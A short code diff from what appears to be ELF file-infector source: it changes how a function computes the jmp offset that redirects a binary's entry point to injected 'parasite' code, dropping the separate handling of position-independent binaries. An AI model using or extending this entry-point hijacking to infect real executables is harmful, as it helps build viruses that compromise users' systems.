@@ -19,20 +19,11 @@ bool redirect_elf_entry_point(Elf64_Half binary_type,
   if (patch_offset_from_parasite_start == -1) {
     return false;
   }
-  int32_t rel = 0;
-  if (binary_type == ET_EXEC) {
-    // for executables, the original entry is the load address, the parasite
-    // load address is the new memory address. Use that for offset calculation.
-    rel = original_entry_point -
-          (parasite_load_address + patch_offset_from_parasite_start + 5);
-  } else if (binary_type == ET_DYN) {
-    // Both original and parasite offset are relative address to the process
-    // start, which is not known until runtime.
-    rel = original_entry_point -
-          (parasite_offset + patch_offset_from_parasite_start + 5);
-  } else {
-    return false;
-  }
+
+  // Calculate the difference between original (destination) and the next
+  // instruction after the jmp.
+  int32_t rel = original_entry_point -
+                (parasite_load_address + patch_offset_from_parasite_start + 5);
 
   constexpr uint64_t branch_op_code = 0xe9;
   auto* patch_addr =
